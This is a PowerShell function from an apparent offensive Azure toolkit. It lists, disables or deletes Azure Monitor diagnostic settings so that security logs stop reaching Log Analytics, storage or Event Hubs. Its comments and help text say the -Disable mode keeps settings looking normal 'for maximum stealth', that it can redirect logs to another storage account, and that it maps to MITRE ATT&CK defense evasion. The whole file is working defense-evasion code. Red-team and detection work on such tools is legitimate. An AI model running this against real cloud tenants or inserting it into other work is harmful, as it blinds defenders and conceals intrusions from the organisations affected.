function Disable-DiagnosticSetting {
    [CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'High')]
    param (
        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceTypeCompleterAttribute()]
        [Alias('resource-type')]
        [string]$ResourceType,

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [Alias('resource-name', 'ResourceName')]
        [string]$Name,

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [Alias('resource-id')]
        [string[]]$Id,

        [Parameter(Mandatory = $false)]
        [switch]$Disable,

        [Parameter(Mandatory = $false)]
        [switch]$Remove,

        [Parameter(Mandatory = $false)]
        [Alias('redirect', 'sink')]
        [string]$RedirectTo,

        [Parameter(Mandatory = $false)]
        [Alias('throttle-limit')]
        [int]$ThrottleLimit = 10
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat -ChangeProfile

        $startTime = Get-Date
        $stats = @{
            TotalResources = 0
            TotalSettings  = 0
            Modified       = 0
            Removed        = 0
            Skipped        = 0
            ErrorCount     = 0
        }
    }

    process {
        # Discover resources
        $resourceIds = if ($Id) {
            $Id
        }
        elseif ($ResourceType) {
            $params = @{ ResourceType = $ResourceType }
            if ($Name) { $params.Name = $Name }
            (Invoke-AzBatch @params).id
        }
        else {
            Write-Warning "Specify -ResourceType, -Name, or -Id"
            return
        }

        if (-not $resourceIds) {
            Write-Warning "No resources found"
            return
        }

        # Expand storage account sub-resources (blob, queue, table, file services)
        # Diagnostic settings on storage accounts live on these child resources
        $storageSubResources = @(
            '/blobServices/default',
            '/queueServices/default',
            '/tableServices/default',
            '/fileServices/default'
        )

        $expandedIds = @()
        foreach ($rid in $resourceIds) {
            $expandedIds += $rid
            if ($rid -match 'Microsoft\.Storage/storageAccounts' -and
                $rid -notmatch '/(blob|queue|table|file)Services/') {
                foreach ($sub in $storageSubResources) {
                    $expandedIds += "$rid$sub"
                }
            }
        }
        $resourceIds = $expandedIds

        # Extract unique storage account IDs from targets (to avoid self-redirect)
        $targetAccountIds = $resourceIds | Where-Object { $_ -match 'Microsoft\.Storage/storageAccounts' } | ForEach-Object {
            if ($_ -match '(.*)/Microsoft\.Storage/storageAccounts/([^/]+).*') {
                "$($matches[1])/Microsoft.Storage/storageAccounts/$($matches[2])"
            }
        } | Select-Object -Unique

        # If -Disable without -RedirectTo, auto-discover a storage account as sink
        $sinkId = $null
        if ($Disable -and -not $RedirectTo) {
            try {
                $sinkId = (Invoke-AzBatch -ResourceType 'Microsoft.Storage/storageAccounts' -Silent | Where-Object {
                    $_.id -notin $targetAccountIds
                } | Select-Object -First 1).id
                if ($sinkId) {
                    $sinkName = ($sinkId -split '/')[-1]
                    Write-Verbose "Auto-selected sink: $sinkName"
                }
            }
            catch {
                Write-Verbose "Could not auto-discover sink storage account"
            }
        }
        elseif ($RedirectTo) {
            $sinkId = $RedirectTo
            Write-Verbose "Using provided sink: $RedirectTo"
        }

        $stats.TotalResources = @($resourceIds).Count
        Write-Verbose "Found $($stats.TotalResources) resource target(s)"

        $resourceIds | ForEach-Object -Parallel {
            $resourceId   = $_
            $authHeader   = $using:script:authHeader
            $sv           = $using:script:SessionVariables
            $userAgent    = $sv.userAgent
            $base         = $sv.armUri
            $api          = '2021-05-01-preview'
            $doDisable    = $using:Disable
            $doRemove     = $using:Remove
            $sink         = $using:sinkId

            $friendlyName = ($resourceId -split '/')[-1]

            try {
                # List diagnostic settings for this resource
                $listUrl = '{0}{1}/providers/microsoft.insights/diagnosticSettings?api-version={2}' `
                    -f $base, $resourceId, $api

                $listParam = @{
                    Headers   = $authHeader
                    Uri       = $listUrl
                    Method    = 'GET'
                    UserAgent = $userAgent
                }
                $response = Invoke-RestMethod @listParam

                $settings = $response.value
                if (-not $settings -or $settings.Count -eq 0) {
                    Write-Verbose "No diagnostic settings on $friendlyName"
                    return
                }

                foreach ($setting in $settings) {
                    $settingName = $setting.name

                    if ($doRemove) {
                        # DELETE the diagnostic setting entirely
                        $deleteUrl = '{0}{1}/providers/microsoft.insights/diagnosticSettings/{2}?api-version={3}' `
                            -f $base, $resourceId, $settingName, $api

                        $deleteParam = @{
                            Headers   = $authHeader
                            Uri       = $deleteUrl
                            Method    = 'DELETE'
                            UserAgent = $userAgent
                        }
                        Invoke-RestMethod @deleteParam | Out-Null
                        Write-Host "  Removed '$settingName' from $friendlyName" -ForegroundColor Red
                    }
                    elseif ($doDisable) {
                        # Disable log categories while keeping metrics enabled and destinations unchanged
                        # This is stealthier as destinations stay the same and metrics keep flowing
                        $hasMetrics = $setting.properties.metrics -and $setting.properties.metrics.Count -gt 0

                        if (-not $hasMetrics) {
                            # Existing setting has no metrics configured, but the resource may support them.
                            # Query available categories to check if Transaction/AllMetrics is available.
                            $catUrl = '{0}{1}/providers/microsoft.insights/diagnosticSettingsCategories?api-version={2}' `
                                -f $base, $resourceId, $api
                            $catParam = @{
                                Headers   = $authHeader
                                Uri       = $catUrl
                                Method    = 'GET'
                                UserAgent = $userAgent
                            }
                            try {
                                $catResponse = Invoke-RestMethod @catParam
                                $metricCats = $catResponse.value | Where-Object {
                                    $_.properties.categoryType -eq 'Metrics'
                                }
                                if ($metricCats) {
                                    # Resource supports metrics — inject them into the setting
                                    $setting.properties | Add-Member -NotePropertyName 'metrics' -NotePropertyValue @(
                                        foreach ($mc in $metricCats) {
                                            @{
                                                category        = $mc.name
                                                enabled         = $true
                                                retentionPolicy = @{ enabled = $false; days = 0 }
                                            }
                                        }
                                    ) -Force
                                    $hasMetrics = $true
                                    Write-Verbose "  Injected metric categories: $($metricCats.name -join ', ')"
                                }
                            }
                            catch {
                                Write-Verbose "  Could not query categories for $friendlyName"
                            }
                        }

                        if ($hasMetrics) {
                            # Disable all logs, enable all metrics, keep destinations
                            foreach ($log in $setting.properties.logs) {
                                $log.enabled = $false
                            }
                            foreach ($metric in $setting.properties.metrics) {
                                $metric.enabled = $true
                            }

                            $putUrl = '{0}{1}/providers/microsoft.insights/diagnosticSettings/{2}?api-version={3}' `
                                -f $base, $resourceId, $settingName, $api

                            $putBody = @{
                                properties = $setting.properties
                            } | ConvertTo-Json -Depth 10

                            $putParam = @{
                                Headers     = $authHeader
                                Uri         = $putUrl
                                Method      = 'PUT'
                                Body        = $putBody
                                ContentType = 'application/json'
                                UserAgent   = $userAgent
                            }

                            try {
                                Invoke-RestMethod @putParam | Out-Null
                                Write-Host "  Disabled logs on '$settingName' for $friendlyName (metrics kept enabled)" -ForegroundColor Yellow
                            }
                            catch {
                                Write-Warning "  Failed to disable logs on '$settingName' for $friendlyName : $($_.Exception.Message)"
                            }
                        }
                        else {
                            # Fallback: no metrics available, redirect to sink
                            $destinations = @(
                                'workspaceId',
                                'storageAccountId',
                                'eventHubAuthorizationRuleId',
                                'eventHubName',
                                'marketplacePartnerId',
                                'serviceBusRuleId'
                            )

                            $removedDest = @()
                            foreach ($dest in $destinations) {
                                if ($setting.properties.PSObject.Properties[$dest]) {
                                    $removedDest += $dest
                                    $setting.properties.PSObject.Properties.Remove($dest)
                                }
                            }

                            if ($removedDest.Count -gt 0) {
                                # Set the sink as the new destination
                                if ($sink) {
                                    $setting.properties | Add-Member -NotePropertyName 'storageAccountId' -NotePropertyValue $sink -Force
                                }

                                $putUrl = '{0}{1}/providers/microsoft.insights/diagnosticSettings/{2}?api-version={3}' `
                                    -f $base, $resourceId, $settingName, $api

                                $putBody = @{
                                    properties = $setting.properties
                                } | ConvertTo-Json -Depth 10

                                $putParam = @{
                                    Headers     = $authHeader
                                    Uri         = $putUrl
                                    Method      = 'PUT'
                                    Body        = $putBody
                                    ContentType = 'application/json'
                                    UserAgent   = $userAgent
                                }

                                try {
                                    Invoke-RestMethod @putParam | Out-Null
                                    $sinkName = if ($sink) { ($sink -split '/')[-1] } else { 'none' }
                                    Write-Host "  Redirected '$settingName' on $friendlyName to $sinkName (no metrics available, was: $($removedDest -join ', '))" -ForegroundColor Yellow
                                }
                                catch {
                                    Write-Warning "  Failed to redirect '$settingName' on $friendlyName : $($_.Exception.Message)"
                                }
                            }
                            else {
                                Write-Verbose "  '$settingName' on $friendlyName has no destinations to redirect"
                            }
                        }
                    }
                    else {
                        # List mode — just display current settings
                        $logCount    = @($setting.properties.logs    | Where-Object { $_.enabled }).Count
                        $metricCount = @($setting.properties.metrics | Where-Object { $_.enabled }).Count
                        $destParts   = @()

                        if ($setting.properties.workspaceId) {
                            $destParts += "Log Analytics"
                        }
                        if ($setting.properties.storageAccountId) {
                            $destParts += "Storage"
                        }
                        if ($setting.properties.eventHubAuthorizationRuleId) {
                            $destParts += "Event Hub"
                        }
                        if ($setting.properties.marketplacePartnerId) {
                            $destParts += "Partner"
                        }

                        $dest = if ($destParts) { $destParts -join ', ' } else { 'None' }

                        [PSCustomObject]@{
                            Resource    = $friendlyName
                            ResourceId  = $resourceId
                            Setting     = $settingName
                            ActiveLogs  = $logCount
                            Metrics     = $metricCount
                            Destination = $dest
                        }
                    }
                }
            }
            catch {
                $errorMsg = $_.Exception.Message

                # Check for resource locks on 403/409 errors
                if ($errorMsg -match '403|409|Forbidden|Conflict') {
                    try {
                        $lockUrl = '{0}{1}/providers/Microsoft.Authorization/locks?api-version=2016-09-01' `
                            -f $base, $resourceId
                        $lockParam = @{
                            Headers   = $authHeader
                            Uri       = $lockUrl
                            Method    = 'GET'
                            UserAgent = $userAgent
                        }
                        $lockResponse = Invoke-RestMethod @lockParam
                        $locks = $lockResponse.value

                        if ($locks -and $locks.Count -gt 0) {
                            $lockNames = ($locks | ForEach-Object {
                                "$($_.properties.level): $($_.name)"
                            }) -join ', '
                            Write-Warning "$friendlyName has resource lock(s): [$lockNames]"
                        }
                        else {
                            Write-Warning "Error processing $friendlyName : $errorMsg (no resource locks found)"
                        }
                    }
                    catch {
                        Write-Warning "Error processing $friendlyName : $errorMsg (could not check locks)"
                    }
                }
                else {
                    Write-Warning "Error processing $friendlyName : $errorMsg"
                }
                Write-Verbose "  Resource ID: $resourceId"
            }
        } -ThrottleLimit $ThrottleLimit
    }

    end {
        $duration = (Get-Date) - $startTime

        Write-Host "`nDiagnostic Settings Summary:" -ForegroundColor Cyan
        Write-Host "   Resources processed: $($stats.TotalResources)" -ForegroundColor White
        Write-Host "   Duration: $($duration.TotalSeconds.ToString('F2')) seconds" -ForegroundColor White

        Write-Verbose "Completed function $($MyInvocation.MyCommand.Name)"
    }

    <#
    .SYNOPSIS
        Disables or removes Azure diagnostic settings to impair logging.

    .DESCRIPTION
        The Disable-DiagnosticSetting function enumerates and modifies
        Azure Monitor diagnostic settings on target resources. It can
        disable log collection while preserving metrics, or remove
        diagnostic settings entirely, effectively blinding defenders
        by stopping security telemetry from flowing to Log Analytics,
        Storage Accounts, or Event Hubs.

        Without switches it operates in list mode, showing all active
        diagnostic settings and their destinations. Use -Disable to
        disable log categories (keeping metrics enabled and destinations
        unchanged for maximum stealth), or -Remove to delete settings.

        This maps to MITRE ATT&CK T1562.008 - Impair Defenses:
        Disable or Modify Cloud Logs.

    .PARAMETER ResourceType
        The Azure resource type to target, e.g.
        'Microsoft.Storage/storageAccounts'. Supports tab completion.

    .PARAMETER Name
        Filter to a specific resource name when using -ResourceType.

    .PARAMETER Id
        One or more full Azure resource IDs to target directly.

    .PARAMETER Disable
        Disables log categories while keeping metrics enabled and
        destinations unchanged for maximum stealth. Security logs
        stop flowing but the diagnostic setting appears normal to
        defenders. If the resource has no metrics categories available,
        falls back to redirecting destinations to a sink storage account.
        If no -RedirectTo is specified, auto-selects a storage account
        from the subscription as a sink.

    .PARAMETER Remove
        Deletes the diagnostic setting entirely from the resource.

    .PARAMETER RedirectTo
        Full resource ID of a storage account to use as the sink
        destination when Azure requires at least one destination.
        If omitted, auto-discovers a storage account in the
        current subscription.

    .PARAMETER ThrottleLimit
        Maximum concurrent operations. Default is 10.

    .EXAMPLE
        Disable-DiagnosticSetting -ResourceType 'Microsoft.Storage/storageAccounts'

        Lists all diagnostic settings on all storage accounts.

    .EXAMPLE
        Disable-DiagnosticSetting -ResourceType 'Microsoft.KeyVault/vaults' -Disable

        Disables log collection on all Key Vault diagnostic settings
        while keeping metrics enabled and destinations unchanged.
        Security audit logs stop flowing but the setting appears
        normal to defenders.

    .EXAMPLE
        Disable-DiagnosticSetting -Id $resourceId -Disable -RedirectTo $sinkStorageId

        Redirects a specific resource's diagnostics to the
        provided storage account.

    .EXAMPLE
        Disable-DiagnosticSetting -ResourceType 'Microsoft.Sql/servers' -Remove

        Removes all diagnostic settings from all SQL servers.

    .OUTPUTS
        [PSCustomObject] (list mode)
        Returns objects with properties:
        - Resource: Friendly resource name
        - ResourceId: Full Azure resource ID
        - Setting: Diagnostic setting name
        - ActiveLogs: Count of enabled log categories
        - Metrics: Count of enabled metric categories
        - Destination: Where telemetry is sent

    .NOTES
        Author: BlackCat Security Framework
        Requires: Azure Resource Manager authentication

        Required permissions:
        - Microsoft.Insights/diagnosticSettings/read
        - Microsoft.Insights/diagnosticSettings/write
        - Microsoft.Insights/diagnosticSettings/delete

    .LINK
        MITRE ATT&CK Tactic: TA0005 - Defense Evasion
        https://attack.mitre.org/tactics/TA0005/

    .LINK
        MITRE ATT&CK Technique: T1562.008 - Impair Defenses: Disable or Modify Cloud Logs
        https://attack.mitre.org/techniques/T1562/008/
    #>
}
